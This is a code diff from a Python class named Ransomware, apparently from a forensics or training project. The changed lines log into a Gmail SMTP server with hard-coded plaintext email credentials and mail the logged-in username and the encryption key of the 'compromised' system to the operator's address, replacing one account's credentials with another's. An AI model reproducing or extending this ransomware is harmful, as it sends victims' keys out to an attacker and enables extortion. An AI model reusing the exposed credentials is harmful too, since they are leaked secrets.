@@ -181,11 +181,11 @@ class Ransomware:
         s = smtplib.SMTP('smtp.gmail.com', 587)
         s.starttls()
         timestr = time.strftime("%Y%m%d-%H%M%S")
-        s.login("rlkforensics@gmail.com", "aWn32ZseLnqX")
+        s.login("bryandocker01@gmail.com", "Forensics2020!")
         loggedInUser = os.getlogin()
         message = "System from the user " +loggedInUser + " has been comprimised. Key =  " + str(self.key)
         # print(self.key)
-        s.sendmail("rlkforensics@gmail.com", "rlkforensics@gmail.com", message)
+        s.sendmail("bryandocker01@gmail.com", "bryandocker01@gmail.com", message)
         s.quit()
         with open(keyfile_name, 'wb') as f:
             f.write(self.key)
